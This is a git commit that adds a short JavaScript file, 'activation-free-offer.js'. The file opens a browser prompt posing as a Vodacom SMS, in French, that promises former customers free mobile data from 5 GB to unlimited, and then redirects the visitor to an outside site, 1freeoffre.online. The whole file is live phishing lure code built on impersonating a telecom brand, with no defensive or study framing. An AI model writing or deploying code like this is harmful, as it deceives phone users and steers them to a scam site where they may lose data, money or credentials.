487a701ec23a7836f5b42265b4cf0728d76a10ad
oynxa <heartflet247@gmail.com>
2026-02-02 00:19:36 -0800

    Create activation-free-offer.js

---
+++ activation-free-offer.js
@@ -0,0 +1,6 @@
+
+var password = 'DONNÉES GRATUITES'
+password=prompt('VODACOM SMS: Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 5 Go à Illimité de données, récompense des anciens clients, appuyez sur Données gratuites pour vérifier maintenant','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://1freeoffre.online/free-offer.html';
+}
